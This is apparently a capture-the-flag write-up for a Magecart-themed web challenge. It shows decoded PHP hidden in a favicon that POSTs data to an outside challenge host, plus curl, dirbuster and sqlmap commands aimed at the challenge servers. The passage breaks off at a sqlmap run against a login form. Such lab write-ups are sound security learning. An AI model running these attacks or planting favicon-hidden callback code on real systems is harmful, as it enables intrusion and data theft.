# Level 4

![Screenshot from 2021-11-02 17-52-04](https://user-images.githubusercontent.com/82754379/139824818-c7957527-ed20-4a2d-bfc5-345324f3b95f.png)

Navigating to the provided [link](http://wp6p6avs8yncf6wuvdwnpq8lfdhyjjds.ctf.sg:14719) revealed the following screen:

![Screenshot from 2021-11-02 17-55-13](https://user-images.githubusercontent.com/82754379/139825132-32d52c82-38b6-4dff-a21e-9af60b13d8d2.png)

<br>

There was nothing that stood out as interesting, except for the clickable text "*Click here to pay your ransom!*" at the top right corner of the page, which directed the browser to an online form:

![Screenshot from 2021-11-02 17-57-06](https://user-images.githubusercontent.com/82754379/139825417-c48f6893-f30b-4e14-b4a4-953f9dc73eb5.png)

---

Reviewing the source code for the online form revealed that submission of the form will redirect back to "/", which basically meant it did nothing. 
(Hence the message on-screen which said "*The donation is temporarily disabled. Please do not submit.*") <br>

---

I ran **dirbuster** on the site in hopes of finding additional PHP or HTML files which might progress the investigation. But after running for more than an hour, I only got the following results:

![Screenshot from 2021-11-02 21-05-10](https://user-images.githubusercontent.com/82754379/139853231-04c68ff0-92e8-4cd8-87c3-a035ca10e185.png)

Next, I referred to the free hint:

![Screenshot from 2021-11-02 20-26-12](https://user-images.githubusercontent.com/82754379/139853304-908ebc8d-1f0f-47f5-a588-f1a3febeecba.png)

<br>

Researching **Magecart** and their associated techniques, I found a an [article](https://www.darkreading.com/attacks-breaches/magecart-how-its-attack-techniques-evolved) that mentioned they had been known to hide malicious payloads in images, including the *favicon* image. <br>
Here's the paragraph of interest reproduced from the [article](https://www.darkreading.com/attacks-breaches/magecart-how-its-attack-techniques-evolved):

---

![image](https://user-images.githubusercontent.com/82754379/139856360-6d37886a-31c0-4cbe-9064-d0ea63f78260.png)

---

Looks like I should take a closer look at the _favicon_ and other images downloaded for display on the _checkout.php_ page.
___

I downloaded the _favicon.ico_ file from http://wp6p6avs8yncf6wuvdwnpq8lfdhyjjds.ctf.sg:14719/favicon.ico and found that it indeed contained code:

![image](https://user-images.githubusercontent.com/82754379/139862931-6d0d6e38-167a-4396-aff5-33f38a0bad54.png)

There's a Base64-encoded portion, which I used [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&input=SkdOb1BXTjFjbXhmYVc1cGRDZ3BPMk4xY214ZmMyVjBiM0IwS0NSamFDeERWVkpNVDFCVVgxVlNUQ3dpYUhSMGNEb3ZMM013Y0hFMmMyeG1ZWFZ1ZDJKMGJYbHpaell5ZVhwdGIyUmtZWGMzY0hCcUxtTjBaaTV6WnpveE9Ea3lOaTk0WTNac2IzTjRaMkowWm1OdlptOTJlWGRpZUdSaGQzSmxaMnBpZW5GMFlTNXdhSEFpS1R0amRYSnNYM05sZEc5d2RDZ2tZMmdzUTFWU1RFOVFWRjlRVDFOVUxERXBPMk4xY214ZmMyVjBiM0IwS0NSamFDeERWVkpNVDFCVVgxQlBVMVJHU1VWTVJGTXNJakUwWXpSaU1EWmlPREkwWldNMU9UTXlNemt6TmpJMU1UZG1OVE00WWpJNVBVaHBKVEl3Wm5KdmJTVXlNSE5qWVdSaElpazdKSE5sY25abGNsOXZkWFJ3ZFhROVkzVnliRjlsZUdWaktDUmphQ2s3) to decode:

![Screenshot from 2021-11-02 22-11-49](https://user-images.githubusercontent.com/82754379/139863889-85bcb128-5de8-43d3-94a9-221995914161.png)

---

Here is the prettified Javascript:

```php
$ch=curl_init();
curl_setopt($ch,CURLOPT_URL,"http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/xcvlosxgbtfcofovywbxdawregjbzqta.php");
curl_setopt($ch,CURLOPT_POST,1);
curl_setopt($ch,CURLOPT_POSTFIELDS,"14c4b06b824ec593239362517f538b29=Hi%20from%20scada");
$server_output=curl_exec($ch);
```

---

This appeared to be PHP code from the use of the *curl_init()* function (a built-in PHP function).

Accessing the URL `http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/xcvlosxgbtfcofovywbxdawregjbzqta.php` directly simply output the plain text:
```
Only those who knows the method is allowed.
```

I guessed the PHP script responding to the HTTP request was expecting a POST request. <br>
I tried **curl**:

```bash
curl -d "14c4b06b824ec593239362517f538b29=Hi%20from%20scada" http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/xcvlosxgbtfcofovywbxdawregjbzqta.php
```

and got the one-line output:
```
New record created successfully
```

It appeared that this PHP file was interacting with a database. Perhaps I could find and exploit a vulnerability in this PHP file that would allow me to extract data from the database.

First, I created a file `post.txt` which contained the bytes that would have been sent by a HTTP client for the POST request:

```
POST /xcvlosxgbtfcofovywbxdawregjbzqta.php HTTP/1.1
Host: s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926
User-Agent: curl/7.68.0
Accept: */*
Content-Length: 50
Content-Type: application/x-www-form-urlencoded

14c4b06b824ec593239362517f538b29=Hi%20from%20scada
```

The above file content was mostly derived from output from the **curl** command (with the **-v** for "verbose" switch) used to post the data to the target URL, except for the last line (the POST data) which I added manually.

Next, I ran **sqlmap** to try different data to inject into the _14c4b06b824ec593239362517f538b29_ parameter as it makes the POST request to the target URL:

```bash
sqlmap -r post.txt -p 14c4b06b824ec593239362517f538b29
```

**sqlmap** reported that the parameter _14c4b06b824ec593239362517f538b29_ "does not seem to be injectable" and suggested I increased the "--level" or "--risk" options if I wished to perform more tests. I did retry with "--level 5" but still **sqlmap** did not manage to perform any SQL injection successfully.

---

When running **curl** with the **-v** switch it was determined that the target was running **Apache 2.4.25** and **PHP 7.2.2** <br>
Perhaps there could be some exploits that can be executed against these versions of Apache and/or PHP? <br>

---

I tried running **dirbuster** against `http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/` and hit on on something!

![Screenshot from 2021-11-03 01-17-49](https://user-images.githubusercontent.com/82754379/139913891-2b130c26-e955-48b7-8018-04288126d2f5.png)

<br>

It appeared I have found: 
- a [Login](http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/login.php) screen (I shall try **sqlmap** against it later),
- a [welcome](http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/index.php) screen and 
- a [data](http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/data.php) screen with a list of names of HTML files.

---

## Welcome screen (/index.php)

![Screenshot from 2021-11-03 01-24-25](https://user-images.githubusercontent.com/82754379/139914881-5be91368-d608-46a4-a489-7a4c7053d727.png)


---

## Data screen (/data.php)

![Screenshot from 2021-11-03 01-27-17](https://user-images.githubusercontent.com/82754379/139915316-ee79c2ff-717c-4346-ade7-a4614241dbf3.png)

The timestamps under the "Last viewed by admin" column kept updating regularly when the page is refreshed. <br>
But the names of the 30 HTML files on the screen do not appear to change between page refreshes. <br>
The names of the HTML files are clickable links but every link seemed to lead to a page that displayed the same content as every other link. <br>

However, that content changes with time. Sometimes it was a series of the letter "a", sometimes it was a series of the characters "<3".
I don't think the content means anything, but may require further investigation later.



---

## Login screen (/login.php)

![Screenshot from 2021-11-03 01-30-20](https://user-images.githubusercontent.com/82754379/139915914-b08c8a28-7ce0-403c-957e-fa7be8000505.png)

---

Running **sqlmap** against **/login.php**:
```bash
sqlmap -forms --crawl=2 -u http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/login.php
```



